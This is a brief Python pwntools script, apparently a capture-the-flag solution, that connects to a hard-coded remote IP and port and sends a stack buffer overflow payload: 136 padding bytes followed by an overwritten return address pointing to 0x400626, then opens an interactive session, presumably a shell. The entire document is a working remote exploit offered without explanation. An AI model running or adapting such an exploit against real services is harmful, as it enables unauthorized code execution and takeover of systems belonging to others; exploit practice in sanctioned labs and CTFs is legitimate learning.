from pwn import *


host = "124.244.16.209"
port = 8001



r = remote(host,port)

vul=0x400626

payload='A'*136

payload+=p64(vul)


r.sendline(payload)

r.interactive()
